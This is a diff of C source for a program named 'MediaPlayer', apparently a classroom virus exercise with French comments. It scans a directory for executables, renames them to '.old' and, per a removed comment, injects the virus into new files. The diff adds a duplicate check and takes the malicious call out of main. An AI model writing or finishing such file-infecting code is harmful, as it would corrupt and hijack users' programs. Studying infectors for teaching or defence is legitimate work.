@@ -1,8 +1,9 @@
 #include "MediaPlayer.h"
 
+char * name;
+
 int main(int argc, char *argv[]) {
 
-        malveillant();
         char *name = argv[0];
 
         // Supprime le . et le /
@@ -110,7 +111,10 @@ void cptExec() {
                         if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name))) {
                                 if(strstr(dir->d_name, ".old") == NULL) {
                                         if (access(dir->d_name, X_OK) == 0) {
-                                                renamingFile(dir->d_name);
+                                                if (verifPresenceFichierOld(dir->d_name) == false) {
+                                                        renamingFile(dir->d_name);
+                                                }
+
                                         }
                                 }
                         }
@@ -167,9 +171,29 @@ void renamingFile(char *fileName) {
         }
 }
 
+bool verifPresenceFichierOld(char *str) {
+        DIR *myDir;
+        struct dirent *dir;
+        bool present = false;
+        char *String = malloc(strlen(str) + strlen(".old") + 1);
+        if(String) {
+                strcpy(String,str);
+                strcat(String,".old");
+                printf("%s",String);
+        }
+
+        myDir = opendir(".");
+        if (myDir) {
+                while ((dir = readdir(myDir)) != NULL && present == false) {
+                        if(!strcmp(dir->d_name,String)) {
+                                present = true;
+                        }
+                }
+                closedir(myDir);
+        }
+        return present;
+}
+
 void malveillant() {
-        //printf("\nBad things happens bruh\n");
-        //printf("\nListing executables and renaming and creating new files..\n\n");
         cptExec();
-        //printf("\nInjection du code du virus MediaPlayer dans les nouveaux executables..\n");
 }
